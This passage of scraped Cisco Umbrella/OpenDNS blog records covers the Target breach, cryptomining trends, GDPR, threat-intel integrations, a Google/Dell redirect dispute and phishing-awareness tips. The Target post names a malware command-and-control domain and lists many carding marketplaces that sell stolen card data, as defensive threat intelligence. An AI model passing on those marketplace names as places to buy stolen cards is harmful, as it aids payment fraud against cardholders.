as their resources change and new pools get added. The most practical application of this system that I found was capacity planning. With slight modification, it is possible to use this script to determine the minimum number of hosts required to service all containers. Decreasing hosts, even by one, has the potential for significant cost recovery. Disaster recovery is another application. If a host goes down and a new one needs to be provisioned to take its place, this system can reallocate all containers before the new host is available, then again reallocate when the new host is available. Next Steps The current scheduler is a proof of concept. Its most important use may be capacity planning for selecting the quantity and resources of hosts used for Quadra. To learn more about optimization in Julia, check out my previous blog post on the topic .", "date": "2015-05-06"},
{"website": "Cisco-Umbrella", "title": "Examining the Target Attack and Carding Sites Using Security Graph", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/target-attack-and-carding-sites", "abstract": "Throughout the past several weeks, huge numbers of U.S. consumers were notified about the largest scale consumer payment accounts breach in recent memory, which victimized Target and Neiman Marcus customers, among several other large retailers ( purported but not yet confirmed/released ). This string of attacks targeted the point-of-sale (POS) systems where cashiers swipe a customer’s credit or debit card to collect their payments. The message became clear – customers on the brick-and-mortar retail floors are no exception to the dangers of cyber crime. Nearly all major news outlets and cyber security vendors have covered the breaches themselves, the attacks leading to it, and the Russian teenager who is suspected of writing the malware used in these attacks. Brian Krebs’ blog has the most comprehensive coverage of the sequence of events related to the Target data breach, among many other insightful reports of current cyber security news. After digesting all the information that has been released thus far, we wanted to put together our own timeline of these events for OpenDNS security blog readers. In addition to an overview of the Target breach, we’ve also included information on various versions of malware targeting POS systems dating all the way back to 2012, and a closer look at carding sites with Security Graph. Live traffic from the year-old Dexter Malware 11e2540739d7fbea1ab8f9aa7a107648[.]com is one of the Dexter CnC servers reported 9 months ago by the ASERT research team – we didn’t expect to see continued active traffic to this well-exposed malware, so the above results were slightly disappointing. Examining the temporal requesting patterns to another four DGA Dexter CnC domains shows that the malware makes blunt, straight callbacks with no intention to hide. On the other hand, the newest malware (BlackPOS, and its variant involved in the Target attack) is known to stay dormant at night, and make only sparse CnC callbacks from 9 to 5.  One of the malware home IP addresses is shown in the following snapshot: Carding sites We have also begun monitoring several carding sites (sites that sell stolen credit card data and other stolen online store account information) as more news about the Target attack broke last week: Interestingly, a few of these sites, such as cardsmarket.su and apino1.net, showed spikes of traffic last week. Cardsmarket.su showed its first traffic spike on Jan 14 (57,000+ DNS queries between 10am and 8pm) and a much higher one on Jan 18th (close to 78,000 DNS queries between 2 and 5pm). Apino1.net had a spike on Jan 20th (58,000+ DNS queries between 6 and 9pm). Details on both domains can be seen in the Security Graph screenshots below: In the map below, we show the client IPs distribution during the Jan 18th spike to cardsmarket.su. This does not necessarily directly tie in with the Target credit card heist, but shows the potential surge in interest in stolen cards as the world learns more  about the breach. [load-javascript slug=”carding-clients”] More shady sites Furthermore, by exploring the co-occurence and related domains graphs of cardsmarket.su, we uncover other similar sites (carding and hacking sites) that for the most part have seen increased activity in the past week. We pruned the graphs, and now show some of these sites for awareness: fullz-mart.biz gavi.cc hhfun.com hidden-crime.biz kreditkarten.ru lampeduza.net lampeduza.so octavian.su omerta.cc validmarket.ru validservice.su www.cardsmarket.su www.devil-group.com www.foreverpp.ru xcarder.net", "date": "2014-01-27"},
{"website": "Cisco-Umbrella", "title": "Check Your Electric Bill – Malicious Cryptomining Is Lighting up the Internet", "author": ["Negisa Taymourian"], "link": "https://umbrella.cisco.com/blog/check-your-electric-bill-malicious-cryptomining-is-lighting-up-the-internet", "abstract": "For years we have been hearing about ransomware ad nauseum. Now there is an emerging threat on the scene, and it’s taking over like wildfire: malicious cryptomining. This browser-or software-based threat enables bad actors to hijack system resources to generate cryptocurrencies for nefarious purposes. The market volatility of cryptocurrency makes this emerging threat typically much more financially lucrative than ransomware . Cyber thieves are drawn to cryptomining as it is an easy way for them to generate cash and attack even more people while remaining anonymous. New findings from Cisco Umbrella research shows that in the last nine months there has been a 19x increase in cryptomining activity on the internet. Umbrella protects users from connecting to malicious sites on the internet and analyzes over 175 billion DNS requests daily. The sheer volume of DNS requests gives our researchers a unique view of the internet to better identify trends on threats, faster. Cryptomining research highlights: 19x increase in cryptomining related traffic in the last 9 months of 2018. Top verticals impacted: energy, education, healthcare , local government and media . No industry is safe. Distribution of crypto traffic is spread across all industries. North American and European countries have heavy malicious cryptomining traffic. Environments with 10,000 employees or less are hit the hardest. Explosive growth In 2018, malicious cryptomining consistently ranked as one of the top threats across all internet activity. No other threat has witnessed such massive growth. Total cryptomining activity grew from approximately 600k queries in March 2018 to 11.3 million queries as of December 2018. That is a 19x increase in cryptomining activity across our 90 million Umbrella users. Why should you care? Cryptomining in your environment means you are vulnerable. While browser-based cryptomining can be concerning if it is happening routinely and profusely, you should always be on the lookout for bad actors installing malicious cryptomining software in your network. Why? It’s simply a starting point . Attackers can leverage their presence in your network to execute future attacks. Malicious cryptomining also represents a hidden cost to your organization. Stolen computing resources impacts your electricity costs, Amazon Web Services (AWS) computing costs, and your bottom line. Energy industry most at risk Looking at our corporate Umbrella traffic, in particular, we see that about one third of all cryptomining activity is attributed to energy and utilities organizations. Energy organizations may be hot targets due to their likeliness to use outdated systems and software that are more prone to vulnerabilities. Colleges and universities come in at second place with 22 percent of total cryptomining activity across verticals. Distribution of cryptomining traffic across verticals: North America is a key target Traffic from our corporate users reveals that the majority of cryptomining activity is being targeted at North America. The U.S. accounts for 62 percent of the total cryptomining traffic, followed by EMEA, which accounts for 6 percent of the total. The remaining traffic is distributed across the globe. Volume of cryptomining traffic by country: Size doesn’t matter Unwanted cryptomining is non-discriminatory. Our research shows that malicious cryptomining is highly prevalent everywhere – across all organization sizes, and industries. No one is safe. All organizations need to take action to protect their resources from malicious cryptomining. Smaller organizations, with less mature cyber security teams, are not exempt. They are also being targeted heavily. In fact, the majority of cryptomining traffic we see is impacting organizations with under 10,000 employees. Distribution of cryptomining traffic across organization sizes: Researchers advise that there is no foreseeable sign of illicit cryptomining slowing down in the coming years. Cryptomining will continue to grow rapidly. So, why wait to get protected? How can Cisco Umbrella help? Umbrella is a cloud security platform that protects users from connecting to malicious sites on the internet. By analyzing and learning from internet activity patterns, Umbrella automatically uncovers current and emerging threats, and proactively blocks malicious requests before they reach your network or endpoints. Umbrella customers can detect, block and protect against unwanted cryptomining in their environments by simply enabling the cryptomining security category in their policy settings. Once the cryptomining security category is selected, you can also view cryptomining activity right from the Umbrella dashboard alongside other common threat categories such as malware, phishing and command and control. The ability to detect and block cryptomining is available as standard for all Umbrella customers. Here is what our customers are saying about Umbrella’s cryptomining feature: “Cisco Umbrella helps me to report on the amount of cryptomining that I am seeing in our APAC locations.” — Richard Crowley, Chief Technology Officer (CTO), JWT If you’re ready to learn more about Umbrella and to get protection against threats such as malicious cryptomining, sign up for a free trial today. Additional Resources Learn more about illicit cryptomining by downloading one of these free resources: eBook: Malicious Cryptominers are Eyeing Your Resources White Paper: Defending Your Network from Cryptomining On-Demand Webcast: 2018’s Top Threat Malicious Cryptomining", "date": "2019-02-13"},
{"website": "Cisco-Umbrella", "title": "Five Questions to Ask About Your Data Privacy in the EU", "author": ["Bruce Johnson"], "link": "https://umbrella.cisco.com/blog/five-questions-ask-data-privacy-eu", "abstract": "Cisco Announces New EU Data Warehouse for Cisco Umbrella Data Storage Sprechen sie deutsch? Deutsche Übersetzung unten. (Speak German? German version below.) Data privacy and how it impacts your company is likely top of your mind no matter where you are located. For EU companies, however, protecting customer data is now rule of law, and even your security solutions will need to comply with those rules. Many security vendors store customer data in long-term activity logs for important reporting functions. This data often provides key information to help customers secure their networks and users. Why does this matter? With European Union (EU) data sovereignty laws, including the new General Data Protection Regulation (or GDPR) regulations, storing EU-citizen data in a US-based data center can complicate things for EU companies and for US companies doing business in the EU. Cisco is addressing these concerns and we’re pleased to announce a new EU data warehouse for Cisco Umbrella data storage. You can now select to store your Umbrella log data in the EU or in the US. Now, let’s explore five common questions about data storage, particularly data storage in the EU. 1. Why do security vendors even need to store customers’ data? Vendors primarily store data on the customer’s behalf so that their reporting functions can pull from this data and provide important historical information.  This makes it possible for you to spot trends and anomalies. This becomes especially important when you are dealing with cybersecurity.  Trends and anomalies in security data can indicate security breaches. 2. Why is it important to be able to store your data in the EU? Because of various regulations for EU data sovereignty and data locality, customers in the EU are very interested in where their data is stored.  GDPR has raised awareness further.  Knowing that their data can be stored in the EU can simplify the process for the company’s privacy officer.  Data stored properly in the US data warehouse can still meet EU compliance requirements but may require the company’s privacy officer to apply more scrutiny, making the process more difficult. 3. What is GDPR and who does it affect? The EU GDPR went into effect on May 25, 2018, and applies to all organizations that process EU personal data. Aimed at protecting the fundamental right to privacy, the new regulations are broad, strict, and require adherence from organizations all over the world. 4. Can a product make an organization GDPR compliant? No single product will make an organization GDPR compliant. GDPR is the legislative embodiment of privacy best practices and calls for transparency, fairness, and accountability when processing personal data. GDPR pushes the concepts of Privacy by Design and by Default: privacy and data protection have to be built-in and integrated in all data processing activities performed by the entity (the data controller) or by external organizations on its behalf (the data processor). This is about respecting individual rights, secure processes, and risk management. Well-applied technology solutions can help underpin success. For example, Cisco Umbrella can help customers raise their security levels by blocking suspicious domains that might be compromised. 5. Does personal data need to remain in the EU? No. People often assume that the EU GDPR requires data localization and that personal data must remain in the EU. GDPR provides that EU personal data should be processed in the EU, unless you have approved mechanisms that allow for the international transfer of data. For example, Cisco has certified compliance with the EU-US and Swiss-US Privacy Shield, which commits Cisco to a set of privacy principles and practices aligned to EU law when processing EU personal data in the US. The Shield framework has been deemed “adequate” by the European Commission – meaning EU personal data can flow to Shield-certified companies. Now that we’ve walked through the answers to these common questions on data privacy and storage, let’s take a look at how Cisco Umbrella can help you maintain compliance with GDPR, while protecting against threats on the internet. How does Cisco Umbrella help with EU data privacy? Cisco Umbrella provides the first line of defense against threats on the internet, wherever your users go – on or off the network.  Umbrella uses DNS to stop threats over all ports and protocols — even direct-to-IP connections so you can stop malware before it reaches your endpoints or network. And yes, Umbrella stores important data so that you can see historical trends and keep your network secure. But, the new EU data warehouse for Cisco Umbrella log storage promises to make your life a little less complicated and enhance your data privacy. With Umbrella, you have one less thing to worry about. If you’re interested in learning more about Cisco Umbrella privacy, go here . German Translation Below This Point Fünf Fragen zum Datenschutz in der EU Neues EU Data Warehouse für Cisco Umbrella-Datenspeicherung Der Datenschutz und dessen Auswirkungen auf Ihr Unternehmen stehen wahrscheinlich weit oben auf Ihrer Prioritätenliste, egal wo Ihr Standort sich befindet. Für Unternehmen in der EU bestehen inzwischen ganz besondere Anforderungen an den Schutz von Kundendaten. Diese neuen Regeln werden sich auch auf die verwendeten Sicherheitslösungen auswirken. Viele Security-Anbieter speichern Kundendaten in langfristigen Aktivitätsprotokollen, die für wichtige Berichterstellungsfunktionen verwendet werden. Diese Daten enthalten häufig wichtige Informationen, die Kunden dabei helfen, ihre Netzwerke und Benutzer zu schützen. Warum ist das wichtig? Aufgrund der EU-Datenschutzgesetze einschließlich der Regelungen der neuen Datenschutzgrundverordnung (DSGVO) kann die Speicherung der Daten von EU-Bürgern in einem Rechenzentrum in den USA für EU-Unternehmen und auch für US-Unternehmen mit geschäftlichen Aktivitäten in der EU zu Problemen führen. Mit unserem neuen EU Data Warehouse für die Datenspeicherung in Cisco Umbrella gehen wir auf diese neuen Anforderungen ein. Jetzt können Sie wählen, ob Ihre Umbrella-Protokolldaten in der EU oder in den USA gespeichert werden sollen. Im Folgenden beantworten wir die fünf häufigsten Fragen zur Datenspeicherung, insbesondere zur Datenspeicherung in der EU. Warum müssen Security-Anbieter überhaupt Kundendaten speichern? Anbieter speichern Daten in erster Linie im Namen des Kunden, damit ihre Berichterstellungsfunktionen auf diese Daten zugreifen und wichtige Verlaufsinformationen liefern können. Anhand dieser Daten haben Sie die Möglichkeit, Trends und Anomalien zu erkennen. Dies ist für Sie besonders im Zusammenhang mit Cybersicherheit wichtig. Trends und Anomalien in Security-Daten können Hinweise auf Sicherheitsverletzungen geben. Warum ist es wichtig, diese Daten innerhalb der EU speichern zu können? Aufgrund der verschiedenen in der EU geltenden Bestimmungen zum Datenschutz und bezüglich des Aufbewahrungsorts von Daten sind EU-Kunden sehr daran interessiert, wo ihre Daten gespeichert werden. Die DSGVO hat dieses Bewusstsein zusätzlich verstärkt. Das Wissen, dass ihre Daten in der EU gespeichert werden können, kann den Vorgang für Datenschutzbeauftragte eines Unternehmens vereinfachen. Eine ordnungsgemäße Speicherung von Daten in einem Rechenzentrum in den USA kann zwar weiterhin die EU-Compliance-Anforderungen erfüllen, aber der Datenschutzbeauftragte eines Unternehmens muss in diesem Fall evtl. zusätzliche Kontrollen einsetzen, was den Prozess verkompliziert. Was ist die DSGVO, und wer ist davon betroffen? Die EU-DSGVO trat am 25. Mai 2018 in Kraft und gilt für alle Organisationen, die personenbezogene Daten von EU-Bürgern verarbeiten. Die neuen Vorschriften sollen das Grundrecht auf Privatsphäre schützen. Zu diesem Zweck sind sie weit gefasst, streng und bindend für Organisationen weltweit. Gibt es ein Produkt, mit dem eine Organisation DSGVO-Konformität erreichen kann? Es gibt kein Einzelprodukt, durch dessen Implementierung eine Organisation DSGVO-Konformität erreichen kann. Die DSGVO ist die gesetzliche Festschreibung von Datenschutz-Best-Practices und verlangt Transparenz, Fairness sowie Zurechenbarkeit bei der Verarbeitung personenbezogener Daten. Die DSGVO fordert die Umsetzung der Konzepte „Datenschutz durch Technikgestaltung“ (Privacy by Design) und „Datenschutz durch datenschutzfreundliche Voreinstellungen“ (Privacy by Default): Datenschutz muss von Grund auf in sämtliche Datenverarbeitungsaktivitäten integriert werden, die von der natürlichen oder juristischen Person (dem Verantwortlichen) durchgeführt werden oder von externen Organisationen (Auftragsverarbeiter) im Namen dieser Person. Ziele sind die Durchsetzung von Individualrechten, sichere Prozesse und ein erfolgreiches Risikomanagement. Korrekt implementierte Technologielösungen können die Grundlage für eine erfolgreiche Umsetzung sein. Mit Cisco Umbrella können Kunden beispielsweise verdächtige, möglicherweise kompromittierte Domänen blockieren und so das Sicherheitsniveau ihres Unternehmens steigern. Müssen personenbezogene Daten in der EU bleiben? Nein. Oft wird angenommen, dass die EU-DSGVO eine Standortbindung der Daten und den Verbleib personenbezogener Daten in der EU verlangt. Die DSGVO schreibt vor, dass personenbezogene Daten von EU-Bürgern in der EU verarbeitet werden müssen, es sei denn, ein Unternehmen verwendet zulässige Mechanismen, die eine internationale Übermittlung von Daten ermöglichen. Beispiel: Cisco ist nach dem EU-US-Datenschutzschild und dem Schweiz-US-Datenschutzschild zertifiziert. Im Rahmen dieser Vereinbarung ist Cisco verpflichtet, den EU-Gesetzen entsprechende Datenschutzgrundsätze und -verfahren einzuhalten, wenn in den USA personenbezogene Daten von EU-Bürgern verarbeitet werden. Der Schutzschild wurde von der Europäischen Kommission als „angemessen“ eingestuft. Personenbezogene Daten von EU-Bürgern dürfen also an nach dem Schutzschild zertifizierte Unternehmen übermittelt werden. Sie kennen nun die Antworten auf diese häufig gestellten Fragen zum Thema Datenschutz und Datenspeicherung. Im Folgenden erfahren Sie, wie Cisco Umbrella Sie bei der Einhaltung der DSGVO unterstützt und gleichzeitig Schutz vor Bedrohungen aus dem Internet liefert. Wie hilft Ihnen Cisco Umbrella in puncto EU-Datenschutz? Cisco Umbrella bietet die erste Verteidigungslinie gegen Bedrohungen aus dem Internet, unabhängig davon, ob sich Ihre Benutzer innerhalb oder außerhalb des Unternehmensnetzwerks befinden. Umbrella nutzt DNS und bietet damit Bedrohungsschutz für alle Ports und Protokolle – selbst für direkte IP-Verbindungen. So stoppen Sie Malware, bevor diese Ihre Endpunkte erreicht oder in Ihr Netzwerk eindringt. Ja, Umbrella speichert wichtige Daten, damit Sie Trends verfolgen und die Sicherheit Ihres Netzwerks gewährleisten können. Das neue EU-Rechenzentrum zur Speicherung von Cisco Umbrella-Protokolldaten ermöglicht dabei eine unkomplizierte Speicherung und verbessert zudem Ihren Datenschutz. Mit Umbrella haben Sie also eine Sorge weniger. Weitere Informationen zu Cisco Umbrella und zum Thema Datenschutz finden Sie hier .", "date": "2018-10-04"},
{"website": "Cisco-Umbrella", "title": "Now available: Hive-Cortex Analyzer and Maltego Transform for Investigate", "author": ["Jennifer Liou"], "link": "https://umbrella.cisco.com/blog/now-available-hive-cortex-analyzer-and-maltego-transform-for-investigate", "abstract": "Powered by the new Cisco Umbrella Investigate On-Demand Enrichment API We are pleased to announce three updates for Investigate users. For security teams using The Hive-Cortex for threat intelligence, a new analyzer for Investigate is now available in Cortex. In addition, for security teams using Maltego , there is a new transform option now available. The new transform for Cisco Umbrella Investigate joins the Cisco Threat Grid transform . Powering these integrations is a new package, the Cisco Umbrella Investigate On-Demand Enrichment API. Cisco Umbrella Investigate On-Demand Enrichment API This new entry-level Cisco Umbrella Investigate API package makes it easy for organizations to integrate Investigate threat intelligence with their SIEM, TIP and other security orchestration tools such as Cortex and Maltego. The API allows analysts to access Investigate’s intelligence on-demand and includes a quota of up to 2000 requests a day. TheHive-Cortex Analyzer –  Investigate We are committed to advancing security-related open source technology initiatives and we are excited to offer integration with TheHive, a popular and powerful open source threat intelligence sharing platform (MISP compliant). Cortex is The Hive’s observable analysis engine, which over the past few years has increased the number of its analyzers to over 100. Why use the Investigate analyzer? The Investigate analyzer helps TheHive-Cortex users easily create, enrich, and share observables. Create and enrich domain observable (1) Add a new ‘domain’ observable in The Hive (2) Navigate to the observable’s tab (3) Run the Investigate analyzer (4) Categorization results are presented in the report (5) Observables are tagged accordingly Create and enrich hash observable (1) Add a new hash observable in The Hive (2) Run the Investigate analyzer to retrieve ThreatGrid data associated with the hash (3) Sample results are presented in the report (4) Observables are tagged accordingly (5) More data is available in the raw report Maltego Transform for Investigate For years security teams have relied on Maltego for graphing of various types of entities, such as domains, IPs, and registrants. With the new Investigate transform, security practitioners can have more meaningful and complete visualizations of how various threat intelligence components are connected. Why use the Investigate Transform for Maltego? The Investigate transform helps Maltego users discover hidden but useful details that security teams want when exploring domains, IPs, and other threat intelligence entities. In addition to enabling pivoting between known and new connections between domains and IPs on the same infrastructure, the Investigate transform shows relationships between domains that do not share the same hosting infrastructure. Typically, calls by malicious entities such as malware on a compromised, or other attacker controller machines, to a malicious domain are quickly preceded or followed by calls to other such domains. This relationship is difficult to expose, but Investigate has rich intelligence at a global level via the Cisco Umbrella resolvers to capture these co-occurring requests. Co-occurrences provides incident responders and threat hunters alike a new way of identifying and preventing potential attacks by identifying domains looked up in rapid succession of a given domain. (For more details about co-occurrences, please see “Discovering Malicious Domains Using Co-Occurrences” ). (1) Start with a domain of interest in Maltego. Right-click to access the Investigate transform. Select domain-to-cooccurrences (2) See all the domains that co-occur with the original domain, i.e. DNS queries for the original domain and these domains taking place globally at the same time Summary Cisco Umbrella Investigate threat intelligence data is now more accessible than ever with the integrations of TheHive and Maltego. Coupled with the new Cisco Umbrella Investigate On-Demand Enrichment API, more organizations can establish and conduct faster, effective incident response and threat hunting operations. Getting Started TheHive and Cortex are free to use (GNU 3.0). Maltego Community Edition free to use. Maltego Classic is $999. Users will need an Investigate API key to use the Investigate Cortex Analyzer or the Investigate Maltego transform ( Request a trial of Cisco Umbrella with Investigate). Are you working on a security research project? Please reach out to the Cisco Umbrella Investigate team to see how Investigate can advance your research project. Related Resources https://blog.thehive-project.org/ https://github.com/TheHive-Project/TheHive https://github.com/TheHive-Project/Cortex https://en.wikipedia.org/wiki/Maltego Maltego Transform for Cisco Umbrella Investigate: https://github.com/opendns/opendns_transform", "date": "2018-11-12"},
{"website": "Cisco-Umbrella", "title": "Google turns the page… in a bad way.", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/google-turns-the-page", "abstract": "This is a long post but it’s worth the read. In short, Google and Dell have teamed up to install some software on Dell computers that borders on being spyware. I say spyware because it’s hard to figure out what it is and is even harder to remove. It also breaks all kinds of OpenDNS functionality. At the end, I’ll tell you what we’re doing about it. About a year ago Google and Dell announced a partnership to include the Google Toolbar on new Dell computers. At the same time, Google was trying to convince the Department of Justice that changing the default search engine in the (then) new IE7 was too difficult (when in reality it’s really simple). Installing the toolbar meant that users would have Google as their default search engine in IE7. It also meant that Dell and Google would share some of the revenue from the advertising clicks that resulted from these installations, much like The Mozilla Foundation does with its Firefox browser. The computer hardware business has razor-thin margins which means making a profit is tough. So the opportunity for Dell to get a recurring revenue stream from an existing customer long after the sale of the computer is more than just enticing, it’s huge. It also means a couple other things: Dell and Google have an incentive to make it very hard for users to turn this off. Because users can’t get rid of it, Dell and Google can get away with putting more ads on the page and pushing user-relevant content off the page. They’re now doing both of these things. The screenshot below shows what the Dell-branded Google search results page looks like when you make a typo in your address bar. You can’t even see the search results in the picture (800×600 resolution) because the entire top of the page and right side are plastered with ads. This page isn’t being shown to Dell owners just because they have the Google Toolbar. In fact, uninstalling the Google Toolbar won’t get rid of it. Dell and Google are now installing a second program on computers that intercepts all sorts of queries that the browser would normally try to resolve. This program has no clear name and is very hard to uninstall. In some circles, people would call this spyware. Google tries to explain the hidden software with this ambiguous statement: Wow. Are you kidding me? In order for a user to get rid of this brokenness the person has to remove a piece of software called “Browser Address Error Redirector?” That barely makes sense to techies and it makes no sense to normal people. Would your Mom uninstall something with a name like that? I don’t think so. Not only that, but due to some support inquiries we’ve gotten it seems like this software is being installed on older Dell computers that use some sort of automatic update service from Dell. Is this thing spreading? Ugh. How bad is it? Let’s see what happens with certain queries and what shows up above the fold . For good measure, I’ve included what we do too, for comparison. Typed               Dell/Google             OpenDNS Digg.xom            Paid results            Automatically typo-corrected\nDigg                Paid results            Shortcut / Search results\nDigg,com            Paid results            Search results As an aside, for every single one of these pages, OpenDNS provides an unpaid link at the top of the page asking, “Did you mean Digg.com ?” If Google and Dell were really trying to give users a good experience, they would offer that, at the very least. They are certainly smart enough. Is Google being true to their roots? I love Google’s technology, don’t get me wrong. But I think Google has turned a page here. They have now enabled a piece of software that is hard to remove and forces users to look at a really bad page. In fact, Google knows that this provides users with a dramatically worse experience. Here’s a press release that talks about what people look at while using Google. (You can be sure Google uses similar technology internally.) Here’s a screenshot, with a red-line indicating what is below the fold. The Dell-branded page doesn’t look anything like that at all. If you were to put a heatmap on the Dell-branded page… well, users can only look at ads. Dell and Google’s behavior here isn’t okay. Users never asked for this experience and they can’t get rid of it! Moreover, this new “functionality” breaks things. Instead of making DNS requests, the address bar now sends single word queries to Google. This application breaks a lot of OpenDNS functionality our users love. Typo correction? Broken. Shortcuts? Broken. Google’s application breaks just about every user-benefiting feature we provide with client software that no user ever asked for. We enjoy challenging problems at OpenDNS. But we’d rather spend our time making the Internet better rather than solving problems that shouldn’t have been created in the first place. We know that Google is capable of launching great products and services, but this isn’t one of them. How is OpenDNS solving this problem? Fortunately, we have a fix which does not require more client software. OpenDNS applies intelligence to the network, and we’ve stretched a bit beyond DNS itself to work around Google’s mis-directed efforts. Before I get into that, let me digress for a second: Many of you have toolbars installed on your computer. Some of you have the Google toolbar, some have the Yahoo toolbar, and some of you have Zwinky (Don’t ask… I think little kids use it). These toolbars are able to see every single website you visit when you surf the web. Most report your surfing habits back to the company that operates the toolbar. Toolbars are something worthy to be concerned about, if only because so little attention is paid to them. Okay, back to our solution. We did not want to enter the toolbar market. We don’t have any interest in it, and we don’t believe more software installations are the answer. The solution to this problem was to route Google requests through a machine we run to check if the request is a typo or one of your shortcuts. If it is a typo or shortcut then we do what we always do, just fix the typo or launch your shortcut and send you off on your way. If it’s not one of those two things, we pass it on to Google for them to give you search results. This solution provides the best of both worlds: OpenDNS users get back the features that they love and Google continues to operate without problems. I want people to know (and be sure) that we aren’t doing anything shady. We’re not spying on you. We don’t care what websites you visit. (Check our privacy policy .) Solving the issue like this allows us to fix the problems with Google (and future similar services) without having to route all your traffic through a toolbar or other service. Below, there is a mini-FAQ. Update: Danny Sullivan has a great write-up on this too. Mini-FAQ Will this make Google slower? No. We are doing this URL redirection on all of our servers in all of our locations. Loading Google should take no longer than it took before we made this change. Also, all of Google’s other domains like like gmail.com and even subdomains like reader.google.com still work as they did before. We don’t re-route any of those. Are you tracking or keeping a log of my searches? No way. Absolutely not. We don’t keep copies of your cookies, your search history or anything else that would cause an AOL Search disaster . Any logs we have for technical debugging are wiped within an hour of the request, usually much sooner. We also aren’t in a position to log it for the government, and we aren’t a front for the CIA. “The Feds” already know that if they want to know what websites you visit they can just talk to your ISP, unfortunately. Does this break anything? Nope, but let us know if you see anything awry. What about secure logins to Google? Can you see them? No. Typically when people try to proxy SSL pages it creates an error. We didn’t want that to happen so we did something we think is pretty clever. We actually just forward your packets on to Google when you are doing anything that is secure. This keeps your data encrypted and ensures we can’t perform a Man in the middle attack on you. Does Google know about this? We contacted a couple of friends who work on the security side of things at Google to give them a friendly heads up. They said it’s not a technical or security problem on their end. Based on that we don’t think Google has any problem with it. The technology we’re using is pretty standard stuff.", "date": "2007-05-22"},
{"website": "Cisco-Umbrella", "title": "Avoid Scams While Shopping Online This Holiday Season", "author": ["Kristyanne Patullo"], "link": "https://umbrella.cisco.com/blog/avoid-scams-online-shopping-holiday-season", "abstract": "It’s almost the most wonderful time of the year! Most people might consider that the December holiday season but for me it’s definitely Black Friday and Cyber Monday. Gone are the days of pitching a tent outside of Best Buy at 3am—you can now get all the awesome deals from the convenience of your couch! The problem is, as with most large events on the Internet, there will be more people than usual looking for ways to cash in on unsuspecting shoppers. Using OpenDNS can help prevent you from falling victim to these attacks, but here are a few other tips on how to increase your safety and security while scoring some deals: Check Where Your Emails are Coming From As a savvy shopper I definitely love coupons. In my opinion, one of the best places to get coupons is via email. You have to be careful though–some of the deals really are too good to be true. Phishers are getting more advanced, and are always looking for better ways to trick people into clicking on their links. Sometimes determining whether an email is legitimate or a phish can be like deciphering the microscopic fine print that lists the exclusions on coupons. One of the biggest indicators of a phishing email is where it’s coming from. Remember, these people make money off of tricking you. Many phishing emails look very legitimate and it often takes a diligent eye to spot a phish. One of the first things that I do if I receive a suspicious-looking email is check the domain that the email came from. Most legitimate companies have their own domain from which all emails will be sent. In an email address, the part after the @ is the domain. The part before the domain is the local part, which is chosen, so it can say just about anything. Take a look at the below example: The local part of the email address says macysshopping4, but remember that part can be chosen. Why would an email from Macy’s be sent from a Gmail account? A common phishing technique is to make the local part of an email address look legitimate to trick end users. The domain Macy’s coupons actually come from is @email.macys.com. Email addresses can also be spoofed; a correct sending address does not necessarily mean the email is legitimate. Spoofing is when the sender email address is forged. Someone can forge sending you an email from shop@email.macys.com but it wasn’t actually sent by Macy’s. That is why you should also check the content of the email. Check Before You Click Did you know that before you click, most browsers will show where the link you are hovering over goes? Similar to emails, webpages also have domains. When I hover over a link in this email the browser shows me the location the link will take me to before I click on it. If I know this email is from Macy’s, it makes sense that links within this email should take me to macys.com . The domain for a webpage is different than an email domain. The subdomain, domain, and top level domain are between the protocol and path of a URL: The protocol declares how your browser should communicate with the web server you are browsing, but we’ll talk about this later. The subdomain is a subdivision of the main domain. In the above example, community is a section of the domain opendns . Every domain ends in a top level domain (TLD), TLDs form the root zone of the DNS system. It’s important to check that the domain of a web page correlates with the web page you are intending to visit. The path refers to the file or directory on the webserver where a particular URL lives. Like with the local part of an email address, the path can be edited to say anything. If you are in an email you believe is from Macy’s, which URL is most likely not a phish? hxxp://www.macys.com/shop/womens-clothing or hxxp://www.xqnrr.com/macys/shop/womens-clothing? If you chose the first URL you are correct. The domain of this URL is macys.com, which shows that this URL is hosted on the Macy’s domain and the path goes to the women’s clothing section. The second URL is hosted on the domain xqnrr.com but the path of the URL was made to look like it is a Macy’s website. Confirm You are Using a Secure Connection Before you enter any payment or personal information into a website, make sure your browser is using an SSL (Secure Socket Layer) connection. SSL provides a secure connection between a web server and your browser. This helps ensure that a third party cannot easily view your payment/personal information. How can you tell if your browser has a secure connection? The URL will start with https:// and you will see a lock in the address bar: An https:// at the beginning of a URL indicates that the data you are transmitting will be encrypted between the client (your browser) and the end server (the server the website you are accessing is hosted on) to better protect your information. Paypal phishes are quite frequent; one way to spot a Paypal phish is that it will lack an SSL connection: This specific phish also has the bonus of a spelling error which is also indicative of phishing pages and emails. Also, be wary of pages that are asking you for unnecessary information. You shouldn’t need to enter your social security number to purchase a new iPad. Be cautious of the data you are providing/putting out on the World Wide Web. Make Sure Your Computer/Device is Virus Free and Up to Date Before the big shopping day you should confirm that the computer or device you will be using for shopping is not infected with malware or adware and that all updates have been completed. If your computer has malware on it your information becomes very easy to steal. Certain types of malware install keyloggers on your machine that can record every keystroke and provide malicious parties with usernames, passwords, credit card numbers, and any other personal information that you type. Any type of malware or adware on your machine makes it less secure, so be sure to use up-to-date AntiVirus that scans your machine regularly for these types of infections. Also make sure that all updates have been completed on your machine. Many updates, particularly for your operating system and browser, contain security patches that protect you from known vulnerabilities. Use OpenDNS! Our DNS service offers an added layer of security that will protect you from known phishing sites. If you do happen to come across a shady site while shopping you’ll see the OpenDNS block page rather than a page that can potentially steal your data or infect your machine. Be Smart The best way to be safe while shopping on the Internet is to be smart about what you are doing. Take the necessary precautions to make sure your computer or device is clean and updated. Also take the extra minute to confirm that the email or website you are viewing is safe. Sometimes being safe can be time consuming, but it will take a lot less time than you’d have to spend reclaiming stolen information, fighting fraud charges, or in extreme cases, reclaiming your identity.", "date": "2014-11-21"},
